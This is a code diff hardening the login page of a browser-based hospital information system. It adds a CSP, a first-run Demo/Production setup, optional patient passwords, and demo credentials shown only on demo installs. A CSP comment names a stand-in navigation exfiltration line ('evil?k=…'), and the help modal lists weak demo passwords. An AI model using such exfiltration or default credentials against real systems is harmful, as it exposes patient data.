@@ -2,6 +2,20 @@
 <html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8">
+  <!--
+    Content-Security-Policy (defense-in-depth). The app is 100% same-origin, so
+    default-src/connect-src/img-src 'self' block outbound network REQUESTS (fetch,
+    XHR, sendBeacon, image beacons): even if a script is injected (malicious
+    extension, DOM clobbering, prototype pollution), it cannot phone a stolen
+    passphrase or PHI home that way, and remote script sources are refused.
+    CAVEAT: 'unsafe-inline' is still required (the UI uses inline onclick handlers
+    + styles throughout), so an injected inline script can still RUN — and CSP
+    cannot block top-level NAVIGATION exfil (window.location = 'evil?k=…'); closing
+    both needs dropping 'unsafe-inline' via a nonce refactor of the inline handlers.
+    'wasm-unsafe-eval' is required to compile the bundled sql.js WebAssembly.
+    frame-ancestors / HSTS can't be set via a meta tag — use HTTP headers at your host.
+  -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>HIS — Hospital Information System</title>
   <link rel="stylesheet" href="css/main.css">
@@ -36,6 +50,15 @@
       <!-- Debug Button -->
       <div style="text-align: center; margin-bottom: 16px;">
         <button type="button" class="btn btn-sm btn-secondary" onclick="clearDatabase()" style="font-size: 0.75rem;">🔄 Reset Database</button>
+      </div>
+
+      <!-- Local-only data scope notice: this app stores data in THIS browser's
+           IndexedDB. Hosting the files over an IP does NOT share the database
+           between computers — each browser has its own. Warn staff so they don't
+           manage the same patients from two workstations and collide. -->
+      <div style="background:#fffbeb;border:1px solid #fcd34d;color:#92400e;border-radius:8px;padding:8px 12px;margin-bottom:16px;font-size:0.78rem;line-height:1.5;text-align:center;">
+        &#9888; <strong>Local device only</strong> — data is stored in <strong>this browser on this computer</strong> and is <strong>not shared</strong> with other workstations. Do not manage the same patients from multiple devices.<br>
+        <span dir="rtl">البيانات مخزّنة في هذا المتصفح على هذا الجهاز فقط، ولا تتم مشاركتها مع الأجهزة الأخرى.</span>
       </div>
 
       <!-- Login Mode Toggle -->
@@ -81,6 +104,13 @@
               Format: YYYY-MM-DD
             </small>
           </div>
+          <div class="form-group">
+            <label id="lbl-pt-pw" for="patient-password">Password — كلمة المرور</label>
+            <input type="password" id="patient-password" autocomplete="current-password" aria-label="Patient portal password">
+            <small class="form-hint" style="display:block;margin-top:4px;color:#6b7280;font-size:0.75rem">
+              Only if you've set one. MRN + Date of Birth are identity, not a password.
+            </small>
+          </div>
         </div>
 
         <button type="submit" class="btn btn-primary" id="login-btn">Login — دخول</button>
@@ -95,12 +125,12 @@
     <!-- Header -->
     <header class="app-header">
       <div class="header-left">
-        <button class="menu-toggle" onclick="toggleSidebar()">&#9776;</button>
+        <button class="menu-toggle" onclick="toggleSidebar()" aria-label="Toggle navigation menu">&#9776;</button>
         <h2>HIS</h2>
       </div>
       <div class="header-right">
         <div id="staff-inbox-wrap" style="position:relative;display:none;">
-          <button id="staff-inbox-btn" onclick="toggleStaffInbox()" title="Notifications"
+          <button id="staff-inbox-btn" onclick="toggleStaffInbox()" title="Notifications" aria-label="Notifications"
             style="background:none;border:1px solid #d1d5db;border-radius:6px;padding:6px 10px;cursor:pointer;font-size:1.1rem;position:relative;">
             🔔<span id="staff-inbox-badge" style="display:none;position:absolute;top:-4px;right:-4px;background:#dc2626;color:#fff;border-radius:10px;padding:1px 6px;font-size:0.65rem;font-weight:700;">0</span>
           </button>
@@ -133,52 +163,145 @@
   <!-- ============================================================ -->
   <!-- SCRIPTS -->
   <!-- ============================================================ -->
-  <!-- All libraries served LOCALLY — fully offline-ready -->
-  <script src="vendor/sql-wasm.js"></script>
-  <script src="vendor/qrcode.min.js"></script>
-  <script src="vendor/chart.umd.min.js"></script>
+  <!-- All libraries served LOCALLY — fully offline-ready.
+       `defer` lets the parser finish (and the browser paint) while scripts
+       download; execution order is still guaranteed. The inline boot script
+       below waits for DOMContentLoaded, which fires after deferred scripts. -->
+  <script src="vendor/sql-wasm.js" defer></script>
+  <script src="vendor/qrcode.min.js" defer></script>
+  <!-- chart.umd.min.js is NOT loaded here: only the hospital-manager analytics
+       view uses it, so router.js ensureChartJs() fetches it on demand. -->
 
   <!-- App modules (order matters) -->
-  <script src="js/lang.js"></script>
-  <script src="js/utils.js"></script>
-  <script src="js/db.js"></script>
-  <script src="js/blackbox.js"></script>
-  <script src="js/auth.js"></script>
-  <script src="js/suggest.js"></script>
-  <script src="js/smart-phrases.js"></script>
-  <script src="js/clinical-decision.js"></script>
-  <script src="js/calculators.js"></script>
-  <script src="js/easy-features.js"></script>
-  <script src="js/router.js"></script>
+  <script src="js/lang.js" defer></script>
+  <script src="js/utils.js" defer></script>
+  <script src="js/allergy-check.js" defer></script>
+  <script src="js/crypto-store.js" defer></script>
+  <script src="js/db.js" defer></script>
+  <script src="js/api.js" defer></script>
+  <script src="js/blackbox.js" defer></script>
+  <script src="js/auth.js" defer></script>
+  <script src="js/suggest.js" defer></script>
+  <script src="js/smart-phrases.js" defer></script>
+  <script src="js/clinical-decision.js" defer></script>
+  <script src="js/calculators.js" defer></script>
+  <script src="js/easy-features.js" defer></script>
+  <script src="js/router.js" defer></script>
 
   <script>
     // ============================================================
     // App Boot
     // ============================================================
 
-    (async function boot() {
+    // Runs at DOMContentLoaded: deferred scripts above are guaranteed to have
+    // executed by then, so all app globals exist.
+    window.addEventListener('DOMContentLoaded', async function boot() {
+      // ── Live Update: wrap saveDBToIndexedDB to auto-broadcast ──
+      const _origSave = window.saveDBToIndexedDB;
+      window.saveDBToIndexedDB = async function() {
+        const result = await _origSave.apply(this, arguments);
+        // Broadcast a generic "db_updated" event so other tabs re-render
+        if (typeof HIS_CHANNEL !== 'undefined' && HIS_CHANNEL) {
+          HIS_CHANNEL.postMessage({ table: '_any_', view: typeof currentView !== 'undefined' ? currentView : '', ts: Date.now() });
+        }
+        return result;
+      };
+
       // Apply language immediately to prevent flash
       applyLanguage();
       updateLoginLabels();
       updateLangButtons();
 
+      // No saved session → the login screen needs no database, so show it now
+      // instead of staring at a blank page while sql.js compiles and the DB
+      // loads (or first-boot seeding runs). Only the submit button stays
+      // gated until initDB() resolves. With a saved session we keep the page
+      // hidden until the dashboard routes, to avoid a login-screen flash.
+      const loginBtn = document.getElementById('login-btn');
+      if (!localStorage.getItem(SESSION_KEY)) {
+        loginBtn.disabled = true;
+        document.body.classList.remove('loading');
+      }
+
       try {
         await initDB();
         console.log('[HIS] Database initialized');
 
-        // Check if there's an active session
-        const session = getCurrentSession();
+        // First run (browser mode): no accounts exist yet — the operator picks
+        // Demo (sample hospital) or Production (no default accounts; the IT
+        // admin is created right here). Login stays gated until the choice
+        // completes; a refresh mid-choice just re-enters this screen.
+        if (typeof DB_NEEDS_FIRST_RUN !== 'undefined' && DB_NEEDS_FIRST_RUN) {
+          showFirstRunChooser();
+        }
+
+        // Check if there's an active session. In server mode, restore it from
+        // the HttpOnly cookie (survives reload) rather than localStorage.
+        const session = (typeof SERVER_MODE !== 'undefined' && SERVER_MODE)
+          ? restoreServerSession()
+          : getCurrentSession();
         if (session) {
           routeToDashboard();
+        }
+
+        // Server mode: live updates from the shared DB. PRIMARY channel is the
+        // server's SSE push (/api/events) — a write on ANY workstation lands
+        // here in ~milliseconds, so all connected devices edit the same data in
+        // real time. The 4s version poll stays as the FALLBACK (stream dropped,
+        // proxy stripped SSE, very old browser) and is skipped while the push
+        // channel is live. Refresh is skipped while a modal or focused form
+        // field is open so it never clobbers something the user is typing.
+        if (typeof SERVER_MODE !== 'undefined' && SERVER_MODE) {
+          let _lastVer = -1, _es = null, _esLive = false;
+          const refreshIfStale = (version) => {
+            if (typeof version !== 'number') return;
+            if (_lastVer === -1) { _lastVer = version; return; }   // baseline, not a change
+            if (version === _lastVer) return;
+            _lastVer = version;
+            if (typeof currentView === 'undefined' || !currentView || !getCurrentSession()) return;
+            const ae = document.activeElement;
+            const busy = document.querySelector('.modal-overlay, .alert-overlay')
+              || (ae && ['INPUT', 'TEXTAREA', 'SELECT'].includes(ae.tagName));
+            if (!busy) navigateTo(currentView);
+          };
+          const connectEvents = () => {
+            if (_es || typeof EventSource === 'undefined') return;
+            if (!getCurrentSession()) return;   // 403 before login — don't spam reconnects
+            try { _es = new EventSource('/api/events'); } catch (e) { _es = null; return; }
+            // First message carries the CURRENT version: on a fresh connect it
+            // sets the baseline; on an auto-reconnect it catches any writes
+            // missed while the stream was down (refreshIfStale sees the jump).
+            _es.onmessage = (ev) => {
+              _esLive = true;
+              try { refreshIfStale(JSON.parse(ev.data).version); } catch (e) {}
+            };
+            _es.onerror = () => {
+              _esLive = false;
+              try { _es.close(); } catch (e) {}
+              _es = null;   // the interval below reconnects (and polls meanwhile)
+            };
+          };
+          connectEvents();
+          setInterval(async () => {
+            connectEvents();          // (re)establish push after login or a drop
+            if (_esLive) return;      // push is live — no need to poll
+            try {
+              const r = await fetch('/api/db/version', { credentials: 'same-origin' });
+              if (!r.ok) return;
+              refreshIfStale((await r.json()).version);
+            } catch (e) {}
+          }, 4000);
         }
       } catch (err) {
         console.error('[HIS] Failed to initialize database:', err);
         showError('Failed to initialize database. Please check your internet connection for the first load.');
       }
 
-      // Remove loading class to show the page
+      // Remove loading class to show the page; re-enable the gated login button
+      // (unless the first-run chooser still owns the screen — it re-enables on done)
+      loginBtn.disabled = (typeof DB_NEEDS_FIRST_RUN !== 'undefined' && DB_NEEDS_FIRST_RUN);
       document.body.classList.remove('loading');
-    })();
+    });
 
     // ============================================================
     // Language Switching
@@ -277,6 +400,7 @@
           // Patient portal login
           const mrn = document.getElementById('patient-mrn').value.trim();
           const dob = document.getElementById('patient-dob').value;
+          const ptPassword = (document.getElementById('patient-password') || {}).value || '';
 
           if (!mrn || !dob) {
             errorEl.textContent = t('error_required');
@@ -286,13 +410,25 @@
             return;
           }
 
-          const result = await loginPatient(mrn, dob);
+          const result = await loginPatient(mrn, dob, ptPassword);
           if (result.success) {
             showSuccess(t('success_login'));
             routeToDashboard();
             if (typeof window.resetIdleTimer === 'function') window.resetIdleTimer();
+            if (result.mustSetPassword && typeof showSetPatientPasswordModal === 'function') {
+              setTimeout(() => showSetPatientPasswordModal(false), 800);
+            }
           } else {
-            errorEl.textContent = t(result.errorKey || 'patient_login_error');
+            let msg = t(result.errorKey || 'patient_login_error');
+            if (result.errorKey === 'login_locked' && result.lockedSec) {
+              const mins = Math.ceil(result.lockedSec / 60);
+              msg += ' (' + mins + (lang === 'ar' ? ' دقيقة' : ' min') + ')';
+            }
+            if (result.errorKey === 'patient_password_required') {
+              msg = lang === 'ar' ? 'هذا الحساب محمي بكلمة مرور. أدخل كلمة المرور.' : 'This account is password-protected — enter your password.';
+              const pf = document.getElementById('patient-password'); if (pf) pf.focus();
+            }
+            errorEl.textContent = msg;
             errorEl.classList.add('show');
           }
         } else {
@@ -371,12 +507,30 @@
     // ============================================================
 
     async function clearDatabase() {
-      if (confirm('Clear all data and reset database?\n\nUsername: admin\nPassword: HIS@2024')) {
+      if (confirm('Clear ALL local data and reset the database? This cannot be undone. (On next start you will choose Demo or Production setup again.)')) {
         try {
-          // Delete from IndexedDB
-          const idb = await openIDB();
-          const tx = idb.transaction('databases', 'readwrite');
-          tx.objectStore('databases').delete('main');
+          // Wipe EVERY persisted copy (current blob + all generational snapshots),
+          // not just the legacy 'main' key — otherwise a snapshot would silently
+          // reload the "deleted" data. wipeLocalDatabase() clears the whole store.
+          if (typeof wipeLocalDatabase === 'function') {
+            await wipeLocalDatabase();
+          } else {
+            // Fallback if db.js failed to load: open IndexedDB with the RAW
+            // API (openIDB also lives in db.js, so it's equally unavailable
+            // here — the old fallback could never run).
+            const idb = await new Promise((res, rej) => {
+              const req = indexedDB.open('HIS_Storage', 1);
+              req.onupgradeneeded = () => req.result.createObjectStore('databases');
+              req.onsuccess = () => res(req.result);
+              req.onerror = () => rej(req.error);
+            });
+            await new Promise((res, rej) => {
+              const tx = idb.transaction('databases', 'readwrite');
+              tx.objectStore('databases').clear();
+              tx.oncomplete = res;
+              tx.onerror = () => rej(tx.error);
+            });
+          }
 
           // Reload page to reinitialize
           setTimeout(() => location.reload(), 500);
@@ -511,7 +665,9 @@
 
         // Escape = close topmost overlay/modal
         if (e.key === 'Escape') {
-          const overlay = document.querySelector('.alert-overlay');
+          // The first-run chooser is NOT dismissable — closing it would strand
+          // the user at a login screen that stays disabled until reload.
+          const overlay = document.querySelector('.alert-overlay:not(#first-run-overlay)');
           if (overlay) { e.preventDefault(); overlay.remove(); }
         }
 
@@ -523,11 +679,108 @@
     })();
 
     // ============================================================
+    // First-run chooser (browser mode): Demo vs Production
+    // ============================================================
+
+    function showFirstRunChooser() {
+      const ar = currentLanguage() === 'ar';
+      const overlay = document.createElement('div');
+      overlay.className = 'alert-overlay';
+      overlay.id = 'first-run-overlay';
+      overlay.innerHTML = `
+        <div class="alert-modal" style="max-width:560px">
+          <h2 style="margin-bottom:4px">${ar ? 'الإعداد لأول مرة' : 'First-time setup'}</h2>
+          <p class="text-muted" style="margin-bottom:16px;font-size:0.85rem">${ar
+            ? 'كيف سيُستخدم هذا الجهاز؟'
+            : 'How will this device be used?'}</p>
+          <div style="display:flex;flex-direction:column;gap:10px">
+            <button type="button" class="btn btn-secondary" id="fr-demo" style="padding:14px;text-align:start;white-space:normal">
+              <strong>${ar ? 'وضع التجربة' : 'Demo'}</strong><br>
+              <span style="font-size:0.8rem;opacity:.85">${ar
+                ? 'مستشفى تجريبي كامل: حسابات وموظفون ومرضى وهميون. لا تُدخل بيانات مرضى حقيقية هنا أبداً.'
+                : 'Full sample hospital: demo logins, staff and fake patients. Never enter real patient data here.'}</span>
+            </button>
+            <button type="button" class="btn btn-primary" id="fr-prod" style="padding:14px;text-align:start;white-space:normal">
+              <strong>${ar ? 'وضع التشغيل الفعلي' : 'Production'}</strong><br>
+              <span style="font-size:0.8rem;opacity:.85">${ar
+                ? 'قاعدة بيانات فارغة بدون أي حسابات افتراضية — ستنشئ حساب مدير النظام الآن.'
+                : 'Empty database with NO default accounts — you create the IT-admin account now.'}</span>
+            </button>
+          </div>
+          <div id="fr-prod-form" style="display:none;margin-top:14px">
+            <div class="form-group">
+              <label for="fr-user">${ar ? 'اسم مستخدم المدير' : 'Admin username'}</label>
+              <input type="text" id="fr-user" autocomplete="off">
+            </div>
+            <div class="form-group">
+              <label for="fr-pass">${ar ? 'كلمة المرور (10 أحرف على الأقل)' : 'Password (at least 10 characters)'}</label>
+              <input type="password" id="fr-pass" autocomplete="new-password">
+            </div>
+            <div class="form-group">
+              <label for="fr-pass2">${ar ? 'تأكيد كلمة المرور' : 'Confirm password'}</label>
+              <input type="password" id="fr-pass2" autocomplete="new-password">
+            </div>
+            <div id="fr-err" style="color:#c0392b;font-size:0.8rem;min-height:1.2em;margin-bottom:6px"></div>
+            <button type="button" class="btn btn-primary" id="fr-create" style="width:100%">${ar ? 'إنشاء الحساب وبدء التشغيل' : 'Create account & start'}</button>
+            <p class="text-muted" style="font-size:0.75rem;margin-top:8px">${ar
+              ? 'نصيحة: بعد تسجيل الدخول فعّل تشفير الجهاز من إعدادات تقنية المعلومات لحماية البيانات المخزنة.'
+              : 'Tip: after logging in, enable device encryption in IT settings to protect stored data at rest.'}</p>
+          </div>
+        </div>`;
+      document.body.appendChild(overlay);
+      const setBusy = (b) => overlay.querySelectorAll('button').forEach(x => { x.disabled = b; });
+      const finish = () => { overlay.remove(); document.getElementById('login-btn').disabled = false; };
+      document.getElementById('fr-demo').onclick = async () => {
+        setBusy(true);
+        try { await completeFirstRun('demo'); finish(); }
+        catch (e) { setBusy(false); alert((ar ? 'فشل الإعداد: ' : 'Setup failed: ') + e.message); }
+      };
+      document.getElementById('fr-prod').onclick = () => {
+        document.getElementById('fr-prod-form').style.display = 'block';
+        document.getElementById('fr-user').focus();
+      };
+      document.getElementById('fr-create').onclick = async () => {
+        const u = document.getElementById('fr-user').value;
+        const p = document.getElementById('fr-pass').value;
+        const p2 = document.getElementById('fr-pass2').value;
+        const err = document.getElementById('fr-err');
+        if (p !== p2) { err.textContent = ar ? 'كلمتا المرور غير متطابقتين' : 'Passwords do not match'; return; }
+        setBusy(true); err.textContent = '';
+        try { await completeFirstRun('production', { username: u, password: p }); finish(); }
+        catch (e) { setBusy(false); err.textContent = e.message; }
+      };
+    }
+
+    // ============================================================
     // Help Modal
     // ============================================================
 
     function showHelpModal() {
       const lang = currentLanguage();
+      // Demo credentials are only a thing on a DEMO install (browser mode with
+      // the sample hospital seeded). Production and server installs must never
+      // print working passwords on screen.
+      let demoInstall = false;
+      try {
+        demoInstall = !(typeof SERVER_MODE !== 'undefined' && SERVER_MODE)
+          && typeof dbGet === 'function'
+          && !!dbGet("SELECT user_id FROM users WHERE username = 'dr.omar'");
+      } catch (e) { demoInstall = false; }
+      const accountsSection = demoInstall ? `
+          <h3 style="margin:16px 0 8px;font-size:0.9rem">${lang==='ar'?'حسابات تجريبية':'Demo Accounts'}</h3>
+          <table class="shortcuts-table" style="font-size:0.8rem">
+            <tr><td><strong>admin</strong></td><td>HIS@2024</td><td>${lang==='ar'?'مدير النظام':'IT Admin'}</td></tr>
+            <tr><td><strong>manager</strong></td><td>manager123</td><td>${lang==='ar'?'مدير المستشفى':'Hospital Manager'}</td></tr>
+            <tr><td><strong>dr.ahmed</strong></td><td>doctor123</td><td>${lang==='ar'?'استشاري باطنية':'Consultant'}</td></tr>
+            <tr><td><strong>nurse.fatima</strong></td><td>nurse123</td><td>${lang==='ar'?'ممرضة':'Nurse'}</td></tr>
+            <tr><td><strong>pharm.ali</strong></td><td>pharm123</td><td>${lang==='ar'?'صيدلاني':'Pharmacist'}</td></tr>
+            <tr><td><strong>lab.nasser</strong></td><td>lab123</td><td>${lang==='ar'?'تقني مختبر':'Lab Tech'}</td></tr>
+            <tr><td><strong>diet.amira</strong></td><td>diet123</td><td>${lang==='ar'?'أخصائية تغذية':'Dietitian'}</td></tr>
+            <tr><td><strong>sw.hessa</strong></td><td>social123</td><td>${lang==='ar'?'أخصائية اجتماعية':'Social Worker'}</td></tr>
+          </table>` : `
+          <p class="text-muted" style="margin:16px 0 0;font-size:0.8rem">${lang==='ar'
+            ? 'تُدار الحسابات من قبل مدير النظام لديك.'
+            : 'Accounts are managed by your system administrator.'}</p>`;
       const overlay = document.createElement('div');
       overlay.className = 'alert-overlay';
       overlay.innerHTML = `
@@ -542,17 +795,7 @@
             <tr><td><kbd>Ctrl</kbd>+<kbd>P</kbd></td><td>${lang==='ar'?'طباعة الصفحة الحالية':'Print current page'}</td></tr>
           </table>
 
-          <h3 style="margin:16px 0 8px;font-size:0.9rem">${lang==='ar'?'حسابات النظام':'System Accounts'}</h3>
-          <table class="shortcuts-table" style="font-size:0.8rem">
-            <tr><td><strong>admin</strong></td><td>HIS@2024</td><td>${lang==='ar'?'مدير النظام':'IT Admin'}</td></tr>
-            <tr><td><strong>manager</strong></td><td>manager123</td><td>${lang==='ar'?'مدير المستشفى':'Hospital Manager'}</td></tr>
-            <tr><td><strong>dr.ahmed</strong></td><td>doctor123</td><td>${lang==='ar'?'استشاري باطنية':'Consultant'}</td></tr>
-            <tr><td><strong>nurse.fatima</strong></td><td>nurse123</td><td>${lang==='ar'?'ممرضة':'Nurse'}</td></tr>
-            <tr><td><strong>pharm.ali</strong></td><td>pharm123</td><td>${lang==='ar'?'صيدلاني':'Pharmacist'}</td></tr>
-            <tr><td><strong>lab.nasser</strong></td><td>lab123</td><td>${lang==='ar'?'تقني مختبر':'Lab Tech'}</td></tr>
-            <tr><td><strong>diet.amira</strong></td><td>diet123</td><td>${lang==='ar'?'أخصائية تغذية':'Dietitian'}</td></tr>
-            <tr><td><strong>sw.hessa</strong></td><td>social123</td><td>${lang==='ar'?'أخصائية اجتماعية':'Social Worker'}</td></tr>
-          </table>
+          ${accountsSection}
 
           <p class="text-muted" style="margin-top:16px;font-size:0.75rem;text-align:center">
             ${lang==='ar'?'تلميح: انقر على شعار HIS خمس مرات لمفاجأة!':'Tip: Click the HIS logo 5 times for a surprise!'}
@@ -689,21 +932,6 @@
       document.body.appendChild(overlay);
     }
 
-    // ── Live Update: wrap saveDBToIndexedDB to auto-broadcast ──
-    (function patchSaveDB() {
-      const _origSave = window.saveDBToIndexedDB;
-      window.saveDBToIndexedDB = async function() {
-        const result = await _origSave.apply(this, arguments);
-        // Broadcast a generic "db_updated" event so other tabs re-render
-        if (typeof broadcastUpdate === 'function') {
-          // We don't know the table here, so broadcast a generic signal
-          if (typeof HIS_CHANNEL !== 'undefined' && HIS_CHANNEL) {
-            HIS_CHANNEL.postMessage({ table: '_any_', view: typeof currentView !== 'undefined' ? currentView : '', ts: Date.now() });
-          }
-        }
-        return result;
-      };
-    })();
   </script>
 </body>
 </html>
